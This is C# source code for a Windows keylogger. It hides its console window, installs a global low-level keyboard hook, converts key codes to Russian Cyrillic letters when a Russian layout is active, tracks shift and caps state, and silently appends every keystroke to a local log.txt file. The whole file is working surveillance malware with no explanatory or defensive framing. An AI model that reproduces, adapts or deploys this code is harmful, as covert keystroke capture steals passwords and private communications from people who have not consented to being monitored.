using System;
using System.Collections.Generic;
using System.Globalization;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace ConsoleApplication1
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr hwnd, IntPtr proccess);
        [DllImport("user32.dll")] static extern IntPtr GetKeyboardLayout(uint thread);
        public static CultureInfo GetCurrentKeyboardLayout()
        {
            try
            {
                IntPtr foregroundWindow = GetForegroundWindow();
                uint foregroundProcess = GetWindowThreadProcessId(foregroundWindow, IntPtr.Zero);
                int keyboardLayout = GetKeyboardLayout(foregroundProcess).ToInt32() & 0xFFFF;
                return new CultureInfo(keyboardLayout);
            }
            catch (Exception _)
            {
                return new CultureInfo(1033); // Assume English if something went wrong.
            }
        }

        private static Dictionary<string, string> alpha = new Dictionary<string, string>
        {
            {"a", "ф"},
            {"b", "и"},
            {"c", "с"},
            {"d", "в"},
            {"e", "у"},
            {"f", "а"},
            {"g", "п"},
            {"h", "р"},
            {"i", "ш"},
            {"j", "о"},
            {"k", "л"},
            {"l", "д"},
            {"m", "ь"},
            {"n", "т"},
            {"o", "щ"},
            {"p", "з"},
            {"q", "й"},
            {"r", "к"},
            {"s", "ы"},
            {"t", "е"},
            {"u", "г"},
            {"v", "м"},
            {"w", "ц"},
            {"x", "ч"},
            {"y", "н"},
            {"z", "я"},
            {"oemtilde", "ё"},
            {"oemcomma", "б"},
            {"oemperiod", "ю"},
            {"oem1", "ж"},
            {"oem7", "э"},
            {"oemopenbrackets", "х"},
            {"oem6", "ъ"},
        };
        private static Dictionary<string, string> spec = new Dictionary<string, string>
        {
            {"space", " "},
            {"return", Environment.NewLine},
            {"lshiftkey", ""},
            {"rshiftkey", ""},
            {"back", ""},
            {"capital", ""},
        };
        private static bool isShift = false;

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                CultureInfo cultureInfo = GetCurrentKeyboardLayout();
                bool isRus = cultureInfo.Name.Substring(0, 2) == "ru";
                int vkCode = Marshal.ReadInt32(lParam);
                string keyName = ((Keys)vkCode).ToString().ToLower();
                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    if (isRus && alpha.ContainsKey(keyName))
                    { keyName = alpha[keyName]; }
                    bool isCaps = Console.CapsLock;
                    isCaps = isShift ? !isCaps : isCaps;
                    if (keyName == "lshiftkey" || keyName == "rshiftkey")
                    { isShift = true; }
                    if (spec.ContainsKey(keyName))
                    { keyName = spec[keyName]; }
                    if (isCaps)
                    { keyName = keyName.ToUpper(); }
                    using (StreamWriter sw = new StreamWriter(@".\log.txt", true))
                    { sw.Write(keyName); }
                }
                else if (wParam == (IntPtr)WM_KEYUP)
                {
                    if (keyName == "lshiftkey" || keyName == "rshiftkey")
                    { isShift = false; }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
